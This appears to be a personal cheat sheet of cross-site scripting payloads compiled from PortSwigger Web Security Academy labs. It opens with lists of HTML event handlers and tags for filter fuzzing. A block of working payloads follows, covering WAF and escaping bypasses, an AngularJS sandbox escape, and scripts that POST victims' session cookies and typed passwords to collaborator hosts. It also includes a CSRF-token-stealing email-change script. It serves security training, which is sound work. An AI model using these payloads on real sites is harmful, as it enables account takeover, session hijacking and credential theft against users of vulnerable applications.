# Events
```
autofocus
onanimationend
onanimationiteration
onanimationstart
onbeforecopy
onbeforecut
onbeforeinput
onbeforetoggle
onblur
onclick
oncontextmenu
oncopy
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
onerror
onfocus
onfocusin
onfocusout
onkeydown
onkeypress
onkeyup
onload
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpaste
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onscrollend
ontoggle(popover)
ontransitionend
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onresize
onbegin
```

# Tags
```
a
a2
abbr
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
audio2
b
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
image2
image3
img
img2
input
input2
input3
input4
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
animate
animatemotion
animatetransform
set
```

``` js
// XSS in a select statement used by location search
"></select><img%20src=1%20onerror=alert()>

// XSS where ng-app (angular JS) is used
{{$on.constructor('alert(1)')()}}

// XSS into HTML with strong WAF
// First used intruder to determine tags
//  To determine tags put <> in search with intruder in the middle
// Then detected events by using <valid tag intruder=1> 
<iframe src="https://0a6800c2037b2283835e7f59004200ec.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></iframe>


// XSS when only custom tags are allowed
<script>
location="https://0af9003204a135f182677fb600be00f6.web-security-academy.net/?search=<xss+autofocus+tabindex%3d1+onfocus%3dalert(document.cookie)></xss>"
</script>

// XSS when some svg tags are allowed
<svg><animatetransform onbegin=alert(1) attributeName=transform></svg>

// Canonical link
// Look in webpage source head
// It will look something like this: <link rel="canonical" href="https://0aea000103b93f8d82710baf0040000f.web-security-academy.net/">
'accesskey='X'onclick='alert() // (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)

// XSS with single quote and backslash escaped
// Breaks out of script and runs new script
</script><script>alert(1)</script>

// XSS with no <>" and single qoutes escaped
\'-alert(1)//

// XSS stored into onclick with "" html encoded and ' and \ escaped
// - &apos can work as single quote
&apos;-alert(1)-&apos;

// XSS into template with <>'"\` unicode escaped
// This was in a template with a string like: `0 results for '${alert()}'` 
${alert(1)}

// XSS to steal session cookies
// Collaborator: 98fsl04mjnu9a94pf47ypuch88ez2pqe.oastify.com
// Get session cookie = document.cookie

<script>
fetch('https://98fsl04mjnu9a94pf47ypuch88ez2pqe.oastify.com', {method: 'POST', mode: 'no-cors', body:document.cookie});
</script>

// XSS to steal passwords
// Collaborator: nc3tzgvymabeuftyt7mu0pev3m9dx3ls.oastify.com
// Makes a fake username and password field for it to fill out

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://i4norbnte539maltl2epsk6qvh1ap0dp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:'User: '+username.value+'\n'+'Password: '+this.value
});"></input>

// XSS to use CSRF to change email
// Gets the CSRF token and then makes a new request

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=change@test.com')
};
</script>

Other Payloads
'"><svg/onload=fetch(`//qlftakffg8o6sfso6idpv5k80z6qugi5.oastify.com/cookie?=${encodeURIComponent(document.cookie)}`)>
```
